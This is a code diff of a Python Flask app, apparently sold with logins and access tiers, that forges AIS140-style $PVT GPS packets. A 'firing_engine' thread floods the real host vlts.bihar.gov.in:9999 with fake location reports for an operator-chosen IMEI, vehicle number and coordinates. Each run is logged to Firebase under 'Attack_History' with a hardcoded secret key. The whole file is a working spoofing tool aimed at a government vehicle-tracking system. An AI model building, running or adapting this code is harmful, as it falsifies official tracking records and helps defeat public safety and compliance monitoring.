@@ -10,34 +10,7 @@ FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]
 
-status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "25.65", "lon": "84.78", "last_pkt": "Ready..."}
-
-LOGIN_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>NITRO V82 - LOGIN</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
-        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
-    </style>
-</head>
-<body>
-    <div class="login-box">
-        <h2>🫦 GHOP-GHOP GPS</h2>
-        {% if error %}<div style="color:red; font-size:12px; margin-bottom:10px;">{{error}}</div>{% endif %}
-        <form method="post">
-            <input type="text" name="userid" placeholder="USER ID" required>
-            <input type="password" name="password" placeholder="PASSWORD" required>
-            <button class="btn">LOGIN</button>
-        </form>
-    </div>
-</body>
-</html>
-"""
+status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "25.298801", "lon": "84.651033", "last_pkt": "Ready..."}
 
 DASH_HTML = """
 <!DOCTYPE html>
@@ -76,10 +49,7 @@ DASH_HTML = """
             <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
             
             {% if session['access_level'] == 'pro' %}
-            <div class="full">
-                <label>📋 PACKET PREVIEW (MIJO FORMAT)</label>
-                <div class="preview" id="preview">Ready...</div>
-            </div>
+            <div class="full"><label>📋 PACKET PREVIEW (MIJO FORMAT)</label><div class="preview" id="preview">Ready...</div></div>
             {% endif %}
 
             <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
@@ -91,9 +61,9 @@ DASH_HTML = """
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        var map = L.map('map').setView([{{lat or 25.65}}, {{lon or 84.78}}], 15);
+        var map = L.map('map').setView([{{lat or 25.298801}}, {{lon or 84.651033}}], 15);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        var marker = L.marker([{{lat or 25.65}}, {{lon or 84.78}}]).addTo(map);
+        var marker = L.marker([{{lat or 25.298801}}, {{lon or 84.651033}}]).addTo(map);
 
         function updateMap(lat, lon) {
             let pos = [parseFloat(lat), parseFloat(lon)];
@@ -108,10 +78,22 @@ DASH_HTML = """
             let lon = parseFloat(document.getElementById('lon').value || 0).toFixed(6);
             let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
             let t = new Date().toLocaleTimeString('en-GB', {hour12:false}).replace(/:/g, '');
-            
             let str = `$PVT,RA18,1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
             let pre = document.getElementById('preview');
             if(pre) pre.innerText = str;
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    let lt = pos.coords.latitude.toFixed(6);
+                    let ln = pos.coords.longitude.toFixed(6);
+                    document.getElementById('lat').value = lt;
+                    document.getElementById('lon').value = ln;
+                    updateMap(lt, ln); // FIXED: Marker will now move
+                    updatePreview();
+                }, (err) => alert("Browser Error: " + err.message));
+            } else { alert("Location not supported by browser."); }
         }
 
         async function checkVehicle() {
@@ -125,19 +107,6 @@ DASH_HTML = """
                 document.getElementById('lon').value = data.lon;
                 updateMap(data.lat, data.lon);
                 updatePreview();
-            }
-        }
-
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let lt = pos.coords.latitude.toFixed(6);
-                    let ln = pos.coords.longitude.toFixed(6);
-                    document.getElementById('lat').value = lt;
-                    document.getElementById('lon').value = ln;
-                    updateMap(lt, ln);
-                    updatePreview();
-                }, () => alert("Location denied."));
             }
         }
 
@@ -161,11 +130,10 @@ def log_to_firebase():
         vno = status["vno"]
         log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": now.strftime('%Y-%m-%d %H:%M:%S'), "Status": "Active"}
         
-        # FIXED: Indentation and logic for History
+        # Attack History Fix: Ensure both Records and History are saved correctly
         requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
         requests.put(f"{FB_URL}/Attack_History/{date_key}/{user_id}/{vno}/{time_key}.json?auth={FB_SECRET}", json=log_data, timeout=5)
-    except:
-        pass
+    except: pass
 
 def firing_engine():
     target = ("vlts.bihar.gov.in", 9999)
@@ -179,8 +147,7 @@ def firing_engine():
             status["count"] += 1
             sock.close()
             time.sleep(0.02)
-        except:
-            time.sleep(1)
+        except: time.sleep(1)
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -198,8 +165,7 @@ def login():
             session['def_lon'] = str(data.get('lon', '84.651033'))
             status.update({"lat": session['def_lat'], "lon": session['def_lon']})
             return redirect(url_for('dashboard'))
-        else:
-            error = "INVALID ID OR PASSWORD"
+        else: error = "INVALID ID OR PASSWORD"
     return render_template_string(LOGIN_HTML, error=error)
 
 @app.route('/dashboard')
@@ -220,13 +186,12 @@ def action():
     if 'user' not in session: return redirect(url_for('login'))
     val = request.form.get('btn')
     if val == "reset":
-        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat', '25.65'), "lon": session.get('def_lon', '84.78')})
+        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat'), "lon": session.get('def_lon')})
     elif val == "start" and not status["firing"]:
-        status.update({"imei": request.form.get('imei').strip(), "vno": request.form.get('vno').upper().strip(), "lat": request.form.get('lat').strip(), "lon": request.form.get('lon').strip(), "firing": True})
-        log_to_firebase()
+        status.update({"imei": request.form.get('imei', '').strip(), "vno": request.form.get('vno', '').upper().strip(), "lat": request.form.get('lat', '').strip(), "lon": request.form.get('lon', '').strip(), "firing": True})
+        log_to_firebase() # <--- FIXED HISTORY LOGGING
         threading.Thread(target=firing_engine, daemon=True).start()
-    elif val == "stop":
-        status["firing"] = False
+    elif val == "stop": status["firing"] = False
     return redirect(url_for('dashboard'))
 
 @app.route('/data')
